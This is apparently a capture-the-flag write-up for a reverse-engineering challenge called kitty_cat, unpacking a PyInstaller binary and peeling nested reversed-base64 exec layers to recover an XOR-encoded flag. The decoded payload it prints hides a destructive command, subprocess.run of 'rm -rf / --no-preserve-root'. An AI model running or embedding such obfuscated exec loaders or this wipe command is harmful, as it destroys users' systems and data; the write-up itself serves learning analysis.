# Reverse Engineering
## kitty_cat

![](assets/image%2019.png)

```
readelf -S kitty_cat
There are 29 section headers, starting at offset 0xe76cb0:

Section Headers:
[Nr] Name              Type             Address           Offset
Size              EntSize          Flags  Link  Info  Align
[ 0]                   NULL             0000000000000000  00000000
0000000000000000  0000000000000000           0     0     0
[ 1] .interp           PROGBITS         0000000000400238  00000238
000000000000001c  0000000000000000   A       0     0     1
[ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
0000000000000020  0000000000000000   A       0     0     4
[ 3] .note.gnu.bu[...] NOTE             0000000000400274  00000274
0000000000000024  0000000000000000   A       0     0     4
[ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
0000000000000028  0000000000000000   A       5     0     8
[ 5] .dynsym           DYNSYM           00000000004002c0  000002c0
0000000000000810  0000000000000018   A       6     1     8
[ 6] .dynstr           STRTAB           0000000000400ad0  00000ad0
0000000000000335  0000000000000000   A       0     0     1
[ 7] .gnu.version      VERSYM           0000000000400e06  00000e06
00000000000000ac  0000000000000002   A       5     0     2
[ 8] .gnu.version_r    VERNEED          0000000000400eb8  00000eb8
00000000000000b0  0000000000000000   A       6     3     8
[ 9] .rela.dyn         RELA             0000000000400f68  00000f68
0000000000000060  0000000000000018   A       5     0     8
[10] .rela.plt         RELA             0000000000400fc8  00000fc8
0000000000000798  0000000000000018  AI       5    23     8
[11] .init             PROGBITS         0000000000401760  00001760
0000000000000017  0000000000000000  AX       0     0     4
[12] .plt              PROGBITS         0000000000401780  00001780
0000000000000520  0000000000000010  AX       0     0     16
[13] .text             PROGBITS         0000000000401ca0  00001ca0
0000000000008882  0000000000000000  AX       0     0     16
[14] .fini             PROGBITS         000000000040a524  0000a524
0000000000000009  0000000000000000  AX       0     0     4
[15] .rodata           PROGBITS         000000000040a530  0000a530
0000000000002651  0000000000000000   A       0     0     8
[16] .eh_frame_hdr     PROGBITS         000000000040cb84  0000cb84
000000000000030c  0000000000000000   A       0     0     4
[17] .eh_frame         PROGBITS         000000000040ce90  0000ce90
0000000000001590  0000000000000000   A       0     0     8
[18] .init_array       INIT_ARRAY       000000000060ed90  0000ed90
0000000000000008  0000000000000008  WA       0     0     8
[19] .fini_array       FINI_ARRAY       000000000060ed98  0000ed98
0000000000000008  0000000000000008  WA       0     0     8
[20] .data.rel.ro      PROGBITS         000000000060eda0  0000eda0
0000000000000048  0000000000000000  WA       0     0     16
[21] .dynamic          DYNAMIC          000000000060ede8  0000ede8
0000000000000200  0000000000000010  WA       6     0     8
[22] .got              PROGBITS         000000000060efe8  0000efe8
0000000000000010  0000000000000008  WA       0     0     8
[23] .got.plt          PROGBITS         000000000060f000  0000f000
00000000000002a0  0000000000000008  WA       0     0     8
[24] .data             PROGBITS         000000000060f2a0  0000f2a0
0000000000000010  0000000000000000  WA       0     0     8
[25] .bss              NOBITS           000000000060f2c0  0000f2b0
00000000000040b0  0000000000000000  WA       0     0     32
[26] .comment          PROGBITS         0000000000000000  0000f2b0
0000000000000029  0000000000000001  MS       0     0     1
[27] pydata            PROGBITS         0000000000000000  0000f2d9
0000000000e678cd  0000000000000000           0     0     1
[28] .shstrtab         STRTAB           0000000000000000  00e76ba6
0000000000000107  0000000000000000           0     0     1
```

this what i noticed

```
[27] pydata            PROGBITS         0000000000000000  0000f2d9
0000000000e678cd  0000000000000000           0     0     1
```

lets extract python code by

```
python -m pyinstxtractor_ng kitty_cat
```

this give whole dir of files

![](assets/image%2020.png)

main file is challenge.pyc and the file is so big to read i use cyberchef

i see somthing like base 64 in reverse we now == or = is mostly end of base64 but the equal in starting then

```
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)('')
```

i remove those function and classes and reverseed decode but again and again give same result like reamains same

after 4-6 time i lost my patience and try to write code to get the flag defcon{}

```
import base64, marshal, re, ast

data = open("kitty_cat_extracted/challenge.pyc","rb").read()
data = base64.b64decode(marshal.loads(data[16:]).co_consts[1][::-1]).decode()

while "exec" in data:
    s = max(re.findall(r"'([^']+)'", data), key=len)
    s += "=" * (-len(s) % 4)
    try:
        data = base64.b64decode(s[::-1]).decode()
    except:
        break

print(data)

if "defcon{" in data:
    print(data[data.find("defcon{"):data.find("}")+1])
elif "enc" in data:
    enc = ast.literal_eval(re.search(r"\[.*\]", data).group())
    key = int(re.search(r"key\s*=\s*(-?\d+)", data).group(1))
    print("".join(chr(x ^ key) for x in enc)[::-1])
```

most of the line take from ctftimes altered for this challenge

```
import subprocess
enc = [88, 26, 16, 20, 77, 81, 122, 85, 21, 73, 86, 122, 80, 21, 92, 122, 65, 20, 65, 122, 75, 21, 20, 81, 17, 70, 16, 80, 67, 71, 21, 122, 77, 66, 80, 21, 119, 77, 81, 122, 92, 81, 20, 87, 112, 70, 22, 86, 94, 75, 74, 70, 67, 64, 65]
key = 37

decoded_flag = "".join(chr(c ^ key) for c in enc)[::-1]
print("Running sudo rm -rf / ...")
subprocess.run(["rm","-rf","/","--no-preserve-root"])

defcon{s3cUr1ty_thR0ugh_0bfu5c4t10n_d1d_y0u_sl0p_th15?}
```

fortunately I didnt run the the file 👹

![](data:image/svg+xml;base64,)

```
defcon{s3cUr1ty_thR0ugh_0bfu5c4t10n_d1d_y0u_sl0p_th15?}
```
